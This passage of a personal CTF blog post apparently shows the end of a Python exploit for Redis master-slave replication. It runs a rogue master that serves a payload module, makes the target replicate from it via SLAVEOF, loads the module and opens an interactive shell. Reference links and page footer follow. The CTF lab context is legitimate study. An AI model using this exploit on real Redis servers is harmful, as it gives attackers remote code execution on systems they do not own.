class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span><span class="params">(lport)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CRLF</span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    flag=<span class="literal">True</span></span><br><span class="line">    result=<span class="string">""</span></span><br><span class="line">    sock=socket.socket()</span><br><span class="line">    sock.bind((<span class="string">"0.0.0.0"</span>,lport))</span><br><span class="line">    sock.listen(<span class="number">10</span>)</span><br><span class="line">    clientSock, address = sock.accept()</span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        data = clientSock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"PING"</span> <span class="keyword">in</span> data:</span><br><span class="line">            result=<span class="string">"+PONG"</span>+CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"REPLCONF"</span> <span class="keyword">in</span> data:</span><br><span class="line">            result=<span class="string">"+OK"</span>+CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"PSYNC"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"SYNC"</span> <span class="keyword">in</span> data:</span><br><span class="line">            result = <span class="string">"+FULLRESYNC "</span> + <span class="string">"a"</span> * <span class="number">40</span> + <span class="string">" 1"</span> + CRLF</span><br><span class="line">            result += <span class="string">"$"</span> + str(len(payload)) + CRLF</span><br><span class="line">            result = result.encode()</span><br><span class="line">            result += payload</span><br><span class="line">            result += CRLF</span><br><span class="line">            clientSock.send(result)</span><br><span class="line">            flag=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    lhost=<span class="string">"127.0.0.1"</span></span><br><span class="line">    lport=<span class="number">1236</span></span><br><span class="line">    rhost=<span class="string">"127.0.0.1"</span></span><br><span class="line">    rport=<span class="number">1235</span></span><br><span class="line">    passwd=<span class="string">"password"</span></span><br><span class="line">    redis_sock=redis_connect(rhost,rport)</span><br><span class="line">    <span class="keyword">if</span> passwd:</span><br><span class="line">        send(redis_sock,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">    send(redis_sock,<span class="string">"SLAVEOF &#123;&#125; &#123;&#125;"</span>.format(lhost,lport))</span><br><span class="line">    send(redis_sock,<span class="string">"config set dbfilename &#123;&#125;"</span>.format(exp_filename))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    RogueServer(lport)</span><br><span class="line">    send(redis_sock,<span class="string">"MODULE LOAD ./&#123;&#125;"</span>.format(exp_filename))</span><br><span class="line">    interact_shell(redis_sock)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2020/05/22/BSt9OxPVIdlhRJA.png" alt="Snipaste_2020-05-22_15-24-25.png"></p>
+<p>buu的环境暂时关了，到时候打一发看看有没有别的问题。。</p>
+<hr>
+<h3><span id="参考链接">参考链接</span></h3><p> <a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9548962.html</a> </p>
+<p> <a href="https://0verwatch.top/redis-vul.html" target="_blank" rel="noopener">https://0verwatch.top/redis-vul.html</a> </p>
+<p> <a href="https://xz.aliyun.com/t/5665#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-12</a> </p>
+<p> <a href="https://mp.weixin.qq.com/s?__biz=MzAxNTkxMjA1OQ==&amp;mid=2247483778&amp;idx=1&amp;sn=cf5c22377832906f20fff9ee5f10d532&amp;chksm=9bfd9c96ac8a1580f30ef2fb46a9bc2f0bcd3372569c288e24f9238240c54396625c2779e390&amp;mpshare=1&amp;scene=23&amp;srcid=0521KDF34vLm8SpnHv7PehG4&amp;sharer_sharetime=1590061225919&amp;sharer_shareid=8a8448ee03016e30de742559b7359a01#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxNTkxMjA1OQ==&amp;mid=2247483778&amp;idx=1&amp;sn=cf5c22377832906f20fff9ee5f10d532&amp;chksm=9bfd9c96ac8a1580f30ef2fb46a9bc2f0bcd3372569c288e24f9238240c54396625c2779e390&amp;mpshare=1&amp;scene=23&amp;srcid=0521KDF34vLm8SpnHv7PehG4&amp;sharer_sharetime=1590061225919&amp;sharer_shareid=8a8448ee03016e30de742559b7359a01#rd</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-wp3/">
+        <span class="next-text nav-default">网鼎杯-wp3</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
